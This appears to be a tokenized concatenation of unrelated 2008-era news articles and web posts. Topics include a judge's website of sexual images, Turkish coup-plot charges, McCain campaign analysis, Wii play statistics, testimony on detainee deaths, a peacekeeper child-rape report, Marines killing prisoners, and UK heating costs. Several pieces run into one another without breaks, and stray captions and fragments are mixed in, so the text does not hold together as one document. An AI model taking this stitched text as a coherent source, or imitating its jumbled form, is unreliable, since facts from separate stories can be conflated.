Gillers said the disclosure would be humiliating for Kozinski and would “ harm his reputation in many quarters , ” but that the controversy should die there .

He added , however , that if the public concludes the website was intended for the sharing of pornographic material , “ that ’s a transgression of another order . ”
“ It would be very hard for him to come back from that , ” he said .
Kozinski said he would delete some material from his site , including the photo depicting women as cows , which he said was “ degrading and just gross . ”
He also said he planned to get rid of a graphic step - by - step pictorial in which a woman is seen shaving her pubic hair .
Kozinski said he must have accidentally uploaded those images to his server while intending to upload something else .
“ I would not keep those files intentionally , ” he said .
The judge pointed out that he never used appeals court computers to maintain the site .

The sexually explicit material on Kozinski ’s site earlier this week was extensive , including images of masturbation , public sex and contortionist sex .
There was a slide show striptease featuring a transsexual , and a folder that contained a series of photos of women ’s crotches as seen through snug fitting clothing or underwear .
There were also themes of defecation and urination , though they are not presented in a sexual context .
Kozinski , who was named chief judge of the 9th Circuit last year , is considered a judicial conservative on most issues .
He was appointed to the federal bench by then - President Ronald Reagan in 1985 .
He has a national reputation for a brilliant legal mind and has developed a reputation as a champion of the First Amendment right to freedom of speech and expression .
Several year ago , for example , after learning that appeals court administrators had placed filters on computers that denied access to pornography and other materials , Kozinski led a successful effort to have the filters removed .
The judge said it was strictly by chance that he wound up presiding over the Issacs trial in U.S. District Court in Los Angeles .
Appeals court judges occasionally hear criminal cases when they have free time on their calendars and the Isaacs case was one of two he was given , the judge said .
Kozinski said he did n’t think any of the material he posted on his website would qualify as obscene .

“ Is it prurient ?
I do n’t know what to tell you , ” he said .
“ I think it ’s odd and interesting .
It ’s part of life . ”
Before the site was taken down , visitors to https://alex.kozinski.com were greeted with the message : “ Ai n’t nothin’ here .
Y’all best be movin ’ on , compadre . ”
Only those who knew to type in the name of a subdirectory could see the content on the site , which also included some of Kozinski ’s essays and legal writings as well as music files and personal photos .
The judge said he began saving the sexually explicit materials and other items of interest years ago .

“ People send me stuff like this all the time , ” he said .
He keeps the things he finds interesting or funny with the thought that he might later pass them on to friends , he said .

Some Turks believe their government is a threat to secular values A top Turkish prosecutor has brought charges against 86 people allegedly involved in a coup plot .
Aykut Cengiz Engin said those charged included leading figures from the army , business and the secular press .
The charges follow speculation about a shadowy group of hardline nationalists determined to act in what they see as defence of Turkey 's secular values .
Tensions have been rising in Turkey amid efforts to close the ruling party over alleged anti-secular activities .
The Constitutional Court is considering a case against the AK Party , in which it is accused of aiming to introduce Sharia law in Turkey , in contravention of the strictly secular constitution .
The Turkish prime minister and president - both AKP members - are named in that case and could be barred from office .
They and the party reject the charges , which they say are part of a campaign against the party .
' Provocation '
On Monday prosecutor Mr Engin filed charges at an Istanbul court against 86 people , 48 of whom are already in custody .
In the current highly - charged political atmosphere , many think it is no coincidence the two cases are running in tandem
Roger Hardy
BBC Middle East analyst
Court battles divide Turkey " The indictment covers crimes such as forming an armed terror group ... and attempting to overthrow the government by force , " Mr Engin said .
A court must decide within two weeks whether to open the case against the 86 suspects .
They are accused of plotting to create chaos in Turkey , provoking secularist anger and a military coup that would topple the government .
The indictment referred to the killing of a judge in a 2006 armed attack on a court , and the bombing of a secularist newspaper .
There have been several coups by the Turkish military , which sees itself as the ultimate guardian of the country 's secular values .
Some secularists believe the AK Party , many of whose members are former Islamists , is intent on installing Islamism in Turkey .
They say the AKP 's moves to overturn a ban on the Islamic headscarf at universities is evidence of this .
' Deep state ' network Please turn on JavaScript .
Media requires JavaScript to play .
Dozens of suspects have been arrested over the past year , following the discovery of a cache of hand grenades at the house of a retired army officer .
Prime Minister Recep Tayyip Erdogan has promised to crack down on the so - called Ergenekon group - an alleged " deep state " network of renegade ultra-nationalists from the military , police , business and press .
Prosecutor Engin said the 86 charged on Monday include at least one former general , along with journalists , academicians and businessmen .
He said an additional indictment was being prepared against a dozen others , including two senior retired generals arrested earlier this month .
Critics of the government accuse it of using the investigation to suppress some of its most vocal opponents .

Given how much is on the line for the Democrats , it ’s curious that as John McCain returned from a diplomatic tour of Europe and the Middle East , Barack Obama was on his way home from a tropical vacation .
The friendly November playing field that the Democrats anxiously awaited not long ago is tilting more and more towards McCain , whose crossover appeal and “ maverick ” image are likely the perfect antidote to the star power of the Democratic candidates .
New poll numbers show not only show that voters are growing weary of the prolonged Democratic primary , but that they ’re crotchety enough to switch sides in November .
• David Paul Kuhn thinks the general - election calculus has been upended : Polling data shows McCain not only wins more independents versus the Democrats in a general - election scenario , but also leads in crossover voters .
Forget Obamacans — Republican strategists are dreaming of a return of the Reagan Democrat in the form of the McCain crossover voter .
[ Politico ]
• Vaughn Ververs describes a sense of relief among Republicans due to the divided Democratic party and the opportunity they believe McCain has to expand the electoral map and compete in areas considered solidly blue .
[ Horserace / CBS News ]
• Toby Harnden sees a McCain victory as increasingly likely and lists ten things that could make it happen .
Number 5 : Clinton becomes the Democratic nominee .
Number 6 : Obama becomes the Democratic nominee .
[ Telegraph ]
• Likewise , Chuck Todd and Domenico Montanaro see it becoming increasingly harder for Democrats to make up ground in swing states like Colorado , where McCain campaigns today , as the primary race drags on .
[ First Read / MSNBC ]
• Jim Geraghty notes at least one blue state where McCain is still behind : Even with his buddy Joe Lieberman pulling for him , McCain loses Connecticut big to Obama , small to Clinton .
[ Campaign Spot / National Review ]
• Brian C. Mooney posits that record Democratic enthusiasm may be a double - edged sword : Because voters have invested so much in their candidate , they are bound to feel alienated when one loses .
Which is why 28 percent of Clinton supporters would vote McCain if she loses , and 19 percent of Obama supporters would vote for McCain if Obama loses .
[ Boston Globe ]
• Craig Crawford looks at those numbers and other indicators of a divided party and concludes that the Democratic candidates may need to run together or hang separately .

• Josh Marshall , in a video post , argues that McCain has an Achilles ’ Heal — his willingness to continue President Bush ’s Iraq strategy .

More and more people are choosing to " cut the cord " when it comes to their choice of computer mouse .
Wireless mice are becoming increasingly standard in the computer world , and for good reason .
They are typically easier to use , more convenient , and less of a hassle than the wired variety .
They do have one drawback , though - they 've always required batteries - until now ...
A company by the name of A4 Tech has produced the Battery Free Wireless optical mouse , which like the name implies , never needs batteries to power it .
Instead of batteries , the Battery Free mouse uses electromagnetic induction technology to power the mouse via the included " smart " mouse pad .
This special mouse pad is connected to the computer 's USB port , and it works to power the mouse without the need for batteries .
This mouse has some other good features as well , such as a zoom in / out button , vertical / horizontal scroll button , and a customizable button .
This wireless optical mouse comes with a 1 year warranty and is available for $ 29.99 .
Not a bad deal if you consider that it will probably come close to paying itself off in battery savings within two or three years .
I also like the fact that you do n't have to turn the mouse off when you 're done with it in order to save the battery life , like I have to do with my current wireless mouse ( man ... I gotta get me one of these ! ) .

WASHINGTON  The Democrats like to say that electing Senator John McCain would usher in the third term of George W. Bush , and they do not mean it as a compliment .
The Republicans counter that calling the senator “ McBush ” is political spin and that Mr. McCain is his own man .
A look at Mr. McCain ’s 25 - year record in the House and Senate , his 2008 campaign positions and his major speeches over the last three months indicates that on big - ticket issues  the economy , support for continuing the Iraq war , health care  his stances are indeed similar to Mr. Bush ’s brand of conservatism .
Mr. McCain ’s positions are nearly identical to the president ’s on abortion and the types of judges he says he would appoint to the courts .
On the environment , American diplomacy and nuclear proliferation , Mr. McCain has strikingly different views from Mr. Bush , and while he shares the president ’s goals in Iraq , he was at times an outspoken critic of the way the war was managed .
The disparities between the two are murkier on other issues .
On immigration , Mr. McCain started out with Mr. Bush  at odds with the Republican mainstream  by favoring a path to citizenship for millions of illegal immigrants , then backed off and emphasized the border - security - first approach favored by a majority of his party .
Anyone who obsesses over NPD numbers , Media Create data and other signifying - nothing sales info needs to get over themselves .
There 's a new numbers obsession to be had : the Nintendo Channel .

As of last Monday the Wii's Nintendo Channel in the U.S. started spitting out usage stats for most Wii games .
Anyone who opted in and let Nintendo snoop into their play history has been contributing to a public trove of great game usage data .
And we can now use these numbers for speculation at cocktail parties and on our favorite forums .
Nintendo may have just unleashed the best new tool for message board argument since the animated GIF .
To wit : did you think people only bought Wii Play for the remote ?
If so , you 're wrong .
The Nintendo Channel reports that its data - sharing users have played this game for more then four million hours , averaging nine hours per person .
They 're actually playing this game !
The channel also indicates that people who own or rented Wii Play have played it an average of 9.75 times .
So much for the remote theory .

I 've got more numbers for you .
I crunched WiiWare numbers on my own blog and a ton of Wii disc numbers below …
Ugly And Pretty Usage Numbers For Wii Games , Crunched From Wii Nintendo Channel
( While we do n't know just how many people are sharing data with the Nintendo Channel , some of the numbers below indicate that it is at least several hundred thousand system owners . )
G/O Media may get a commission LG 75 - Inch 8K TV Buy for $ 2150 from BuyDig Use the promo code ASL250
Boom Blox : Nintendo Channel users have each logged an average of 8 hours and 25 minutes with this game , playing the game about 3.8 sessions per system it 's been in .
Is this good ?
Bad ?
The game 's been out for a little more than a month and the people who 've bought it have played it about four times .
You tell me .
Wii Fit :
The same population of Nintendo Channel users gave this game an average of 9 hours 14 minutes played per person .
Each person has played it an average of 5.7 times .
So people are using this game more often than they 're using Boom Blox .
A victory for Wii Fit ?
Maybe not , if the idea that the game should be played every day .
Maybe newer users are skewing the numbers .
Or maybe people are n't sticking to their daily workouts .

Wii Sports :
Now this should put all the numbers here in perspective .
This game is a beast , played by data - sharing Channel users for 24,740,000 hours over the course of 21,100,000 sessions .
These people , per person , have spent a ludicrous 33 hours and six minutes with this game .
That 's a lot of bowling and tennis .
Each system that the game 's been played on has hosted an average 28.3 times .
Using my master 's degree , I can deduce that this means that people buy a Wii , insert Wii Sports and then play it again and again and again .
Carnival Games :
Did you turn your nose up at this game ?
Did you assume people bought it by mistake , getting hoodwinked by cute boxart into thinking it was as good as Wii Sports ?
If so , you may have thought that , once people got it home , they 'd decide it stinks and never play it again .
Oh , no no no .
The Nintendo Channel reports that people playing it have logged an average of 7 hours and 44 minutes total play time across 5.6 sessions since buying ( or renting ) the game .
That 's not bad .
But do compare it to the barely month - old Boom Blox numbers above .
Which game would you say is proving more of a hit in households that bought it ?

Metroid Prime 3 : Corruption :
Here it is .
The hardcore gamer 's game for the Wii .
It 's logged 4,113,000 hours of total play time by Nintendo Channel users .
The average total playtime for a gamer who owns MP3 is 21 hours and 16 minutes , meaning people are playing this thing to the end .
They do it across 9.9 sessions .
And if you start doing some fancy math with the numbers in this entry and the ones above , you may notice that the casual games seem to get played an average of an hour per session .
But this hardcore game ropes in its players for two hours at a time .
Okami :
On the other hand , there 's Okami for the Wii .
It 's players have given it an average of 5.7 sessions since buying or renting it .
But here 's the part that makes me feel good and bad at the same time .
The people who own this game and report their stats to the Nintendo Channel have played the game an average total of 14 hours and 25 minutes .
The problem is that the game takes more than 25 hours to finish .
I beat it in over 30 .
What 's that tell you ?
Right .
They 're not finishing it .
It was me , my friends , who suggested that maybe , possibly Okami on PS2 was a tad too long and could stand some trimming when released for the Wii .
I was given a lot of grief .
But look , compared to Metroid , people do n't seem to be finishing the game .

Guitar Hero III : Remember the theory that third party games can't cut it on the Wii ?
You 've probably already seen this game 's high sales numbers .
Here 's something even more incredible for you to comprehend .
Ten million hours logged by Nintendo Channel data - sharing users .
Six million sessions .
An average of thirty play sessions per owner .
And here it is , the big stat ( so big I 'm going to step away from my keyboard to double - check this — okay .
I 'm back ) … .
The average amount of total play time , per Wii owner , for GH III is 53 hours and 28 minutes !
Yeah .
That 's impressive .
It obliterates Metroid Prime and Wii Sports combined .
People put this disc in their Wii , and apparently they do not take it out .
I do believe that people like playing Guitar Hero .
It is proven .
In conclusion :
Do you remember the time when NPDs were the most fun gaming numbers to crunch ?
That day is past .
So I call on you , the Kotaku readers , the NeoGAF hordes , the VGChartz mathematicians , and I call on all of the armchair Pachters out there .
Embrace the Nintendo Channel .
Drink the numbers down .
And start doing the science .

All of the above numbers can be found in the Nintendo Channel on the respective page for each game ( Just do n't look for No More Heroes stats .

They 're not in there . )

At today ’s House Judiciary Subcommittee on Civil Rights hearing on torture , Lawrence Wilkerson , former chief of staff to Colin Powell , told Rep. Jerrold Nadler ( D - NY ) that over 100 detainees have died in U.S. custody , with up to 27 of these declared homicides :
NADLER : Your testimony said 100 detainees have died in detention ; do you believe the 25 of those were in effect murdered ?
WILKERSON : Mr. Chairman , I think the number ’s actually higher than that now .
Last time I checked it was 108 .
VIDEO
A February 2006 Human Rights
First report found that although hundreds of people in U.S. custody had died and eight people were tortured to death , only 12 deaths had “ resulted in punishment of any kind for any U.S. official . ”
Transcript :
NADLER : Colonel Wilkerson , in your prepared testimony , you write that “ as I compiled my dossier for Secretary Powell , and as I did further research , and as my views grew firmer and firmer I had to reread that memo ( of February 7 , 2002 ) , “ I needed to balance in my own mind the overwhelming evidence that my own government had sanctioned abuse and torture , which at its worse had led to the murder of 25 detainees and at least 100 detainee deaths .
We have murder at least 25 people in detention .
That was the clear low point [ lower end of the range ] of the evidence . ”
Your testimony said 100 detainees have died in detention ; do you believe the 25 of those were in effect murdered ?
WILKERSON : Mr. Chairman , I think the number ’s actually higher than that now .
Last time I checked it was 108 , and the total number that were declared homicides by the military services , or by the CIA , or others doing investigations , CID , and so forth — was 25 , 26 , 27 .
NADLER : Were declared homicides ?
WILKERSON : Right , starting as early as December 2001 in Afghanistan .
NADLER : And these were homicides committed by people engaged in interrogations ?
WILKERSON : Or in guarding prisoners , or something like that .
People who were in detention .
NADLER : They were in detention , not trying to escape or anything , declared homicides by our own authorities .

Well , since participating in this thread I 've started to read " A New Earth " because it 's hanging around the house and people here are talking about it .
Frankly , what I 'm seeing so far is simply a riff off a core concept of Buddhism .
Nothing especially dangerous or earth - shattering ( unless you 've never heard it and have been trapped in a strict religious framework , in which case it 's mind - boggling ... is this Oprah right now ? ) .
Tolle is clearly joining the New - Age bandwagon with his commercial website .
It 's not uncommon for various well - known figures in New - Age land to have CDs of lectures , or " inspiration cards " or teaching materials .
Retreats and teacher - trainings are also common .
When offered for a reasonable price , these things can be helpful to people who need hand - holding while exploring their faith .
They can also big outrageous money - grabs .
It just depends .
In the same way as any major world religion has chachka asssociated with it ( rosaries , incense , etc. ) , in the same way as you can deepen your faith in any major world religion by going on a retreat or studying books of religious commentary , so too all this marketing stuff .
If it makes your day to have a new " inspiration card " tucked into your day planner each day , whoo - hoo .
It could just as easily be a Jewish prayer or a saying of Mohammed or some Tolle New - Age ripoff of Buddhism , because you can buy similar stuff for any religion you can dream up ( except maybe Scientology ) .
It all responds to the same impulse some people have .
Ever see " The Guru " ?
All the chachka and stuff reminds me of Marisa Tomei when she gets super into what she thinks is the Hindu religion .
That 's how some people get with the optional add - ons .
If I 'm wrong and Tolle " requires " people to buy all this crap to be enlightened , my apologies .
As of now , though , I 'm not seeing that buying loads of add - on materials has to be part of the Tolle experience .
So it 's not especially Scientology - like , really , especially since there is no coercion , etc . .
The worst I can say about this guy really is that his book is n't especially good .
I 'm also just not getting from all of this that Oprah is entangled in Scientology .
A Course in Miracles is not Scientology , and neither is this Tolle guy 's stuff .
Worst case , she 's got Scientology friends and thus wo n't touch the topic on her show .
Slightly less bad case , she 's making her personal spiritual journey so public that it will embarrass her .
I have no idea if she would consider Scientology just one more New - Age choice among many , try it out herself or suggest it to fans .
I 'd hope not , but frankly I am a bit surprised by her behavior of late so who knows .
To go whole - hog for Tolle seems a bit gullible of her .
I can't imagine that a woman as rich as she is marketing him just to make scads more money for herself .
So like I said , it just seems like she 's on a personal journey , and Middle American is along for the ride .
JUNE 13 -- A St. Louis man claims that he was injured last year after being glued to a toilet seat in a Home Depot and is suing the retail giant for negligence .
Haywood Rosales , 31 , charges that during an August 2007 visit to a Home Depot in Florissant , Missouri he used a store bathroom and came into contact with a toilet seat ' covered with adhesive , ' according to his Circuit Court lawsuit .
Rosales 's lawyers told TSG that their client did not notice the adhesive before sitting down and that he used his cell phone to alert his wife , with whom he was shopping , after realizing 'he was glued to the toilet seat . '
A copy of Rosales 's June 11 lawsuit , first reported by Courthouse News , can be found here .
When Rosales stood up , the complaint asserts , he ' received cuts , bruises , and tearing on his buttocks and thighs , ' and subsequently 'endured the embarrassment , pain , and suffering of the initial injury and its concomitant treatment . '
Rosales , who claims he was ' rendered unable to work ' by his injuries , is seeking in excess of $ 25,000 in damages .
Rosales 's lawyers said their client sued Home Depot after the retailer 's insurer ' summarily rejected ' a claim .
In November 2005 , a Colorado man filed a similar lawsuit against Home Depot , alleging that he was so fused to a toilet seat that paramedics had to remove the seat from the toilet to get him out of the store bathroom .
After almost two years of litigation , the Colorado case was dismissed after a federal judge ruled that Home Depot did not have prior ' actual or constructive knowledge ' of the dangerous toilet , nor was the glue prank foreseeable .
Rosales 's lawsuit refers to the earlier incident , charging that Home Depot should have recognized that ' there would be a strong possibility that instances of copycat behavior would occur . ' ( 4 pages )
A few years ago every outdoor company started making anti-microbial long underwear that used nano fibers of heavy metal woven into their fabric to kill bacteria and eliminate funky synthetic underwear smell .
It turns out that using nano particles of silver woven into your long underwear might be illegal — depending on how it ’s advertised or how you interpret a 1947 law written to prevent farmers from spraying people with pesticide .
Coconuts call to mind frozen drinks , sunscreen and tropical islands for most , but for one Colorado - based company coconuts equal clothing .
Cocona Inc. uses activated carbon extracted from coconut shells - a waste product of the food industry - to create a fabric that is both easy on the environment and high performing .
" We buy what would have gone into the landfills and turn it into a product that dries quickly , releases odor when washed and provides UV protection for the wearer , " said Jon Erb , chief marketing officer for Cocona .
The company was originally named TrapTek for the odor trapping properties of the fabric .
Cocona inventor , Gregory Haggquist , originally thought odor reduction would be the primary selling point , Erb said , but Cocona users quickly changed that by pointing to the fabric 's rapid dry time as the most noticeable quality .
TrapTek 's Cocona was named by Time Magazine as one of the most amazing inventions of 2005 .

Security goons , store - clerks and police officers detained Flickr user " i did n't mean to go to Stoke " for taking photos in the outdoor , pedestrianized area of Middlesbrough , UK :
Moments later as i walked away this goon jumped in front of me and demanded to know what i was doing .
i explained that i was taking photos and it was my legal right to do so , he tried to stop me by shoulder charging me , my friend started taking photos of this , he then tried to detain us both .
I refused to stand still so he grabbed my jacket and said i was breaking the law .
Quickly a woman and a guy wearing BARGAIN MADNESS shirts joined in the melee and forcibly grabbed my friend and held him against his will .
We were both informed that street photography was illegal in the town .
Two security guards from the nearby shopping center THE MALL came running over , we were surrounded by six hostile and aggressive security guards .
They then said photographing shops was illegal and this was private land .
I was angry at being grabbed by this man so i pushed him away , one of the men wearing a BARGAIN MADNESS shirt twisted my arm violently behind my back , i winced in pain and could hardly breathe in agony .
A policewomen was radioed and came over to question the two suspects ( the total detaining us had risen to seven , a large crowd had now gathered )
The detaining guard released me , i asked the policewoman if my friend and i could be taken away from the six guards , she motioned us to a nearby seat and told all the security people to go .
She took our details , name , address , date of birth etc .
She wanted to check my camera saying it was unlawful to photograph people in public , i told her this was rubbish .
we agreed to come with her and we sat in the back of a police car , she radioed back to the station to check our details , i explained to her the law regarding photography and handed over a MOO card , i asked to take her picture and she said no .
We were free to go with no charge .
I may press charges for unlawful detention and physical assault by the security guards , watch this space .

WASHINGTON – The American Civil Liberties Union will mark the addition of the one millionth name to the Transportation Security Administration ’s ( TSA ) terrorist watch list in a July 14th Press Club event .
The roll - over to one million confirms the warnings the ACLU has been making for years : the TSA is pinning American security on a system of watch lists that are bloated , inefficient , ineffective and unfair .
Since February , the ACLU has maintained a " watch list counter " at www.aclu.org/watchlists showing how many records are on the nation ’s terrorist watch list .
The number shown is extrapolated from data in the government ’s own reports .
In mid-July , that counter will reach one million .
This event will feature ACLU experts , as well as victims telling their stories of how the watch list has interfered with their lives .
WHAT : Event to mark the one millionth addition to TSA terrorist watch list
WHO : ACLU privacy experts and watch list victims

Dressed in a white beekeeper suit and full face mask , I pour a small amount of ether into the exit hole of a yellow jacket nest .
Too much ether might kill many of the colony inhabitants , too little might allow them enough mobility to attack me , but just the right amount should send the yellow jackets into dreamland .
After a few minutes , my students and I quickly dig up the nest and place it and the yellow jackets into a sealed box .
Unfortunately , some angry yellow jackets that were n’t affected by the ether always remain behind .
As we work , these justifiably disturbed insects fly around menacingly and ram directly into our face shields in an attempt to drive us off .
If there is even the slightest opening in our suits , they try to enter and sting us .
Collecting yellow jacket nests is always an adrenaline rush and one part of my job as an assistant professor in the School of Biology at the Georgia Institute of Technology .
When metro Atlanta homeowners call me to remove a nest , I ’m happy to help .
I get yellow jacket colonies to study in my biology laboratory and the homeowner gets rid of a dangerous and irritating pest .
Social insects
These pests are just one type of social insect , a group that includes ants , social bees , social wasps and termites .
These insects possess the most complex and developed societies of any animal species and engage in cooperative behaviors that allow them to complete extraordinary tasks .
For example , termites are capable of working together to build nests many thousands of times their own size , and social wasps and bees engage in highly effective defense of their colonies using mass attacks .
So why study social insects ?
First , many social insects have direct impacts on humans .
For instance , honeybees are critical pollinators of important crops , social wasps are key predators of insects , and many ants and termites are serious pests .
Second , understanding how social insects interact provides direct insight into how complex societies , such as those displayed by humans , operate .
Such information can help us understand interactions within human families and between different human groups .
Third , social insects can help us learn how to effectively complete tasks .
That is , we may learn how to efficiently organize ourselves by studying how social insect colonies accomplish their goals .
And finally , the formation of social insect societies represents a delicate balance between the selfish interests of the individual and the welfare of the group .
The issues governing these relationships are important to understanding such diverse issues as the origin of multi-cellular organisms and the factors governing the occurrence of cancer .
Thus , there are many scientifically - important reasons to study social insect societies , but I like to study them because they are so amazing .
Watching social insects interact and understanding how their societies function is fascinating .
Into the fridge
My research group primarily studies yellow jackets , which are highly social wasps in the genus Vespula .
Yellow jackets are highly aggressive and typically construct underground colonies that consist of hundreds to thousands of individuals .
Such colonies are often accidentally discovered by homeowners in the spring or summer .
Like many social insects , yellow jackets fiercely defend their colonies .
Such defensive episodes often result in painful stings for the intruder .
Consequently , most people are happy to have us remove any yellow jacket nests on their property .
When we return to the laboratory with our box of yellow jackets , the insects begin to wake up .
Not surprisingly , they are not happy to find themselves boxed up and try to force or chew their way out .
We place the colony in the refrigerator overnight , which cools the wasps down so they cannot fly .
Once the yellow jackets are cold , we conduct genetic and behavioral analyses on the colonies .
Students in my laboratory study the mating behavior of wasps under controlled laboratory conditions .
In addition , they are investigating the genetic relationships within the colony and the process of development that leads to queens , workers and males .
Even though most people probably think that yellow jackets and other social insects are just a backyard nuisance , understanding their behavior and family dynamics is very important to applied and basic biology .

How times have changed .
Instead of large amounts of meat and spuds , some of the first Americans enjoyed healthy doses of seaweed .
The evidence comes from 27 litres of material collected from the Monte Verde site in southern Chile , widely accepted as the oldest settlement in the Americas .
Nine species of seaweed , carbon dated at 13,980 to 14,220 years old , played a major role in a diet that included land plants and animals .
Tom Dillehay of Vanderbilt University in Nashville , Tennessee , argues that the seaweeds were used both as food and medicine .
Some were found in remains of ancient hearths and others had been chewed into clumps , or “ cuds , ” which may have been used for medicinal purposes .
Indigenous people still use the same species medicinally .
Several of the seaweed species seem to have come from a rocky marine bay that was about 15 kilometres south of the ancient settlement , but three other types are found only on sandy open - ocean shores that , at the time , were 90 km west of the site .
Advertisement
The choice of seaweeds , and local land plants also identified at the site , show that the residents had good knowledge of both coastal resources and foods from the interior , which allowed them to stay in the region year - round , concludes Dillehay , who has studied Monte Verde for three decades .
Slow progress
The most widely accepted theory holds that early Americans came from Asia across the Bering land bridge , eventually reaching South America .
Dillehay says Monte Verde was a logical place to settle .
“ It has one of the highest densities of economic resources for hunter gatherers in the world , ” he says .
Groups moving along the Pacific coast may have done so much more slowly than has been assumed .
As they migrated southwards , people exploited the interior resources of the hundreds of river basins descending from near - coast mountain ranges , Dillehay and colleagues suggest .
“ If all the early American groups were following a similar pattern of moving back and forth between inland and coastal areas , then the peopling of the Americas may not have been the blitzkrieg movement that people have presumed , but a much slower and more deliberate process , ” says Dillehay .
Some theories hold that humans also migrated out of Africa to East Asia and Australia along coasts .
Wider ranging
However the discovery at Monte Verde of plant remains from the Andes shows that the settlers did not just come down the coast , says David Meltzer of Southern Methodist University in Dallas , Texas .
“ They are getting their resources from a wide range of environments , ” he says .
Meltzer adds that recent reports of slightly younger remains from Paisley Caves in Oregon shows that some people were going much further inland .
But the most intriguing – and still unanswered – question is how those early Americans were related to the Clovis people who spread explosively across interior North America around 13,000 years ago .

Twelve - year - old Elizabeth - not her real name - was walking in fields with her brother , following an aunt who had gone ahead to work on the family 's plot of land near the town of Man in north - western Ivory Coast , when they were approached by " les casques bleues " , as UN peacekeepers are known .
" Elizabeth " was raped by 10 UN peacekeepers in Ivory Coast Her brother took a biscuit from one of the men ; she refused .
As Elizabeth tried to run away , one of the soldiers seized hold of her .
There were 10 of them .
I spoke to Elizabeth near her home .
She said : " They grabbed me and threw me to the ground and they forced themselves on me ...
I tried to escape but there were 10 of them and I could do nothing ... I was terrified .
" Then they just left me there bleeding ... "
Elizabeth was raped by 10 peacekeepers and abandoned .
Her village elders say they tried to take the case to UN officials at the camp nearby .
But Domade Jean - Baptiste , one of the village chiefs , said they were made to wait for ages and then sent away .
Elizabeth 's brutal rape is one of an unknown number of sexual assaults carried out by peacekeepers and aid workers , the very people who are brought in to post - conflict areas around the world to protect the vulnerable .
They are suffering in silence

Peacekeepers ' abusing children '
A report by Save the Children UK says such assaults are continuing and , despite an undertaking by the UN and other international bodies to operate a policy of zero tolerance , little appears to be done on the ground to stop the attacks taking place .
The 10 peacekeepers accused of the attack on Elizabeth have returned home .
Save the Children , a leading UK charity , has spent 12 months compiling its report from Ivory Coast , southern Sudan and Haiti .
It details cases where children as young as six years old have been preyed on by aid workers and peacekeepers who , in some cases , trade small quantities of food for sex , or rape and sodomise small children with near total impunity .
Save the Children says one of its most harrowing findings is that the abuse is taking place " in acute silence " , because of an unwillingness of the authorities to investigate the reported assaults and because in many cases the victims are too frightened or too powerless to take action and report what has happened to them .
Elizabeth , now 13 , has been unable to tell her parents about the attack for fear they would throw her out of the house .
She suffers daily pain , nearly a year after the attack , and has abandoned school .
The UN has peacekeepers stationed throughout the world Heather Kerr , country director for Save the Children UK in Ivory Coast , said : " It 's a minority of people who are carrying out the abuse but they are using their power to sexually exploit children , and children that do n't have the voice to report about this .
" They are suffering in silence . "
The United Nations in Ivory Coast has said it welcomes the report and will take note of its findings .
Jean Paul Proulx , the UN Chief Conduct and Discipline Officer , said : " When we have information we take action . "
He said investigations often took six months or more to conclude , but they could only be pursued when information was brought forward .
The UN Department of Peace Keeping Operations ( DPKO ) in New York says that when there is a huge peacekeeping operation around the world , it is not possible to guarantee that abuse does not take place .
Save the Children has urged that stronger measures be taken to prevent the abuse happening .
The charity says better systems need to be in place to allow children to report abuse when it happens , and it is calling for the creation of an international watchdog to translate international concern about child sexual abuse into action that pursues and prosecutes the perpetrators .

What are these ?
In graphic taped interviews played at a preliminary hearing Thursday , two Marines told how they and a third Marine killed four unarmed prisoners in Iraq .
In one interview played at the hearing for Sgt. Ryan Weemer , Sgt. Jermaine Nelson told an agent from the Naval Criminal Investigative Service that he and Weemer were ordered by their sergeant to kill the prisoners as the Marines swept through a Fallouja neighborhood on Nov. 9 , 2004 .
Weemer is charged with murder and dereliction of duty , Nelson faces similar charges , and Sgt. Jose Nazario is charged with manslaughter in federal court in Riverside .
In the interview , Nelson told the investigator that Nazario said , “ I ’m not doing all this . . . by myself .
You ’re doing one and Weemer is doing one . ”

Nelson said that he watched in shock as Nazario shot a kneeling prisoner at point - blank range : “ He hit the dude in the forehead , the dude went down and there was blood . . . all over [ Nazario ’s ] boots . ”
Weemer then used his service pistol to shoot one of the prisoners , Nelson said .
“ He shot him and the dude was on the ground and rolling , and [ Weemer ] was shooting , shooting , shooting , shooting , shooting . ”
Nelson also said in the interview that he saw the faces of the dead prisoners in his dreams .
The case began in 2006 when Weemer , who had left the Marine Corps , was asked by a job interviewer for the Secret Service , “ What ’s the most serious crime you ’ve committed ? ”

Weemer told the interviewer about shooting the prisoners and said other Marines in Fallouja had done the same .
The Marine Corps recalled Weemer to active duty so he could be charged .
Nazario was a probationary Riverside police officer when he was charged .
Nelson and Weemer , in their interviews , said that Nazario ordered the killings after he had radioed a platoon leader to report that they had taken four prisoners and was asked twice , “ Are they dead yet ? ”
The Marines were needed that day to support other Marines sweeping through the insurgent - held city , Weemer said in his interview .
He said he and the others were convinced that the prisoners would escape if they were left alone , and that they would then find weapons and go back to fighting the U.S. forces .
After seeing Weemer and Nazario shoot prisoners , Nelson said , he lost his reluctance to join in the killings .
“ I shot my dude , ” he said .

The hearing officer , at the conclusion of the preliminary hearing , will recommend to Lt. Gen.
Samuel Helland whether the case should go to court martial , be dropped or be handled through an administrative procedure .

The credit crunch hits home
Household bills are now soaring out of proportion .
Diana Appleyard describes the effect it has had on her own family
State of shock : Diana Appleyard 's heating bill is now £ 13,200 a year
Two days ago , I sat in my kitchen , staring at a bill lying on the table , hardly able to believe my eyes .
The cost of two tanks of oil , simply to heat our water and provide fuel for a truly ancient Aga , was £ 2,200 .
It was so absurd I burst out laughing - and then sank my head in my hands .
And this was n't even the annual bill .
These tanks would last for about two months .
So now , thanks to the astronomical cost of oil , heating our house will cost us precisely £ 13,200 a year .
It is beyond belief ; so ridiculous you would laugh if you did n't weep .
You expect small rises in electricity , gas and oil each year .
In the past , when bills arrived , my husband Ross and I would tut , then make small adjustments to the money we spent on luxuries such as holidays and eating out .
It was painful , but merely an irritant .
We 'd get used to the new level of bills - and carry on as normal .
But the past few months have brought us both up short .
We sat down last night and did the sums .
If costs carry on rising at this level , we can't afford to run this house .
We are definitely not having a holiday this summer , nor the next .
The small pleasures of life - eating out , new clothes , a weekend away - will all be axed .
There is no way we can afford to change our cars , both of which have done more than 160,000 miles .
The laughable thing is that most people would say we 're well off .
We work full - time ( I am a writer and Ross has his own media company ) , earn good wages , send our youngest daughter to private school and usually have a couple of holidays a year - one ski-ing , one sun .
If this is making a family like mine fear for its future , how are people on much lower incomes faring ?
So far , so comfortable .
But not any more .
Our heating and electricity bills have almost doubled over the past 12 months .
Filling my car with petrol used to cost £ 56 .
The last time I filled it , I watched in horror as the numbers kept clicking up : £ 80 ... £ 85 ... the final total was £ 93 .
Thanks , Mr Brown .
Friends have stopped travelling long distances at all .
